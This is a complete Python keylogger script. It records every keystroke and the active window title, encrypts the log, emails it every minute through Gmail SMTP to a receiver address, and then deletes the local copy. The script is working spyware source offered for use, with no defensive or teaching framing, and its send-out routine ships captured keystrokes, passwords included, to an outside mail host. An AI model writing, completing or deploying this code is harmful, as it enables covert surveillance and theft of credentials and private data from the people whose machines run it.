import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
from cryptography.fernet import Fernet
import pygetwindow as gw
import time
import os

# Configuration
LOG_FILE = "keylog.txt"
EMAIL_INTERVAL = 60  # Send email every 60 seconds
SENDER_EMAIL = "your_email@gmail.com"
RECEIVER_EMAIL = "receiver_email@gmail.com"
EMAIL_PASSWORD = "your_password"
ENCRYPTION_KEY_FILE = "key.key"

# Generate or load encryption key
if not os.path.exists(ENCRYPTION_KEY_FILE):
    key = Fernet.generate_key()
    with open(ENCRYPTION_KEY_FILE, "wb") as key_file:
        key_file.write(key)
else:
    with open(ENCRYPTION_KEY_FILE, "rb") as key_file:
        key = key_file.read()

fernet = Fernet(key)

# Configure logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(asctime)s - %(message)s"
)

# Function to get the active window title
def get_active_window():
    try:
        return gw.getActiveWindow().title
    except Exception as e:
        return "Unknown"

# Function to encrypt the log file
def encrypt_file(filename):
    with open(filename, "rb") as file:
        data = file.read()
    encrypted = fernet.encrypt(data)
    with open(filename, "wb") as file:
        file.write(encrypted)

# Function to send logs via email
def send_email(log_file):
    try:
        # Create the email
        message = MIMEMultipart()
        message["From"] = SENDER_EMAIL
        message["To"] = RECEIVER_EMAIL
        message["Subject"] = "Keylogger Logs"

        # Attach the log file
        with open(log_file, "r") as file:
            body = file.read()
        message.attach(MIMEText(body, "plain"))

        # Send the email
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(SENDER_EMAIL, EMAIL_PASSWORD)
            server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, message.as_string())
        print("Logs sent via email.")
    except Exception as e:
        print(f"Error sending email: {e}")

# Function to handle key presses
def on_press(key):
    try:
        # Log the key pressed and the active window title
        active_window = get_active_window()
        logging.info(f"Window: {active_window} - Key: {key}")
    except Exception as e:
        print(f"Error logging key: {e}")

# Main function
def main():
    print("Keylogger started. Press ESC to stop.")

    # Set up the keylogger listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    try:
        while listener.is_alive():
            time.sleep(EMAIL_INTERVAL)  # Wait for the email interval
            if os.path.exists(LOG_FILE):
                encrypt_file(LOG_FILE)  # Encrypt the log file
                send_email(LOG_FILE)   # Send the encrypted log file via email
                os.remove(LOG_FILE)   # Delete the log file after sending
    except KeyboardInterrupt:
        print("Keylogger stopped.")

    listener.stop()

if __name__ == "__main__":
    main()